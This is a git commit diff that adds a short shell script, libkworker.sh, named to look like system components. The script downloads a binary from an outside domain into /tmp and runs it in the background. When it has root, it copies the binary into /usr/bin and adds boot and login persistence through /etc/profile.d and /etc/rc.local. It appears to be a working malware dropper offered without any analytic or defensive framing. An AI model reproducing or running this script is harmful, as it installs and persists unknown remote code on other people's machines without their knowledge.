02e0ec6a9eb887520eb30fbbef79b04aeae6b8b1
fsquirt <59900359+fsquirt@users.noreply.github.com>
2022-10-27 00:26:07 +0800

    Add files via upload

---
+++ libkworker.sh
@@ -0,0 +1,16 @@
+cd /tmp
+wget https://colafox.top/systemd-udedv;chmod +x systemd-udedv
+nohup ./systemd-udedv &
+
+if [ `id -u` -eq 0 ];then
+	echo "is running at root"
+	cp systemd-udedv /usr/bin
+	chmod +x /usr/bin/systemd-udedv 
+	echo "nohup systemd-udedv &" > libblockdev.sh
+	cp libblockdev.sh /etc/profile.d
+	chmod +x /etc/profile.d/libblockdev.sh
+	echo "bash /etc/profile.d/libblockdev.sh" >> /etc/rc.local;chmod +x /etc/rc.local
+else
+	echo "not running at root"
+fi
+
